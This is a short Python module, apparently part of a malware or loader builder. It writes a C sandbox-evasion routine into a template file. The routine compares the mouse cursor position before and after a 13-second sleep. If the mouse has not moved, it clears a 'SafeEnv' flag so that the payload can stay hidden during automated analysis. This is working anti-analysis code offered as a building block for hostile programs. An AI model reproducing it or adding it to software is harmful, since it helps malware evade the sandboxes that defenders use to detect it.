def desc():
    return "Check if user moves the mouse x times to detect sanboxes"

def run():
    libs = '''\
#define TIME_DELAY 13000 //13 seconds
'''

    functions = '''\
//Check for Mouse Movement
int checkMousePosition() {
    POINT pos1, pos2;

    GetCursorPos(&pos1);

	// If this sleep is fast forwarded then the mouse movement 
	// remains the same and therefore detects a sandbox env
    Sleep(TIME_DELAY);

    GetCursorPos(&pos2);

	// Check if position remains the same
    return ((pos1.x == pos2.x) && (pos1.y == pos2.y));

}
'''

    keying = '''\
	if (checkMousePosition())
		SafeEnv = FALSE;\
'''

    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{LIBS}}", libs + "\n{{LIBS}}") \
                              .replace("{{FUNCTIONS}}", functions + "\n{{FUNCTIONS}}") \
                              .replace("{{KEYING}}", keying + "\n{{KEYING}}")

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)

    return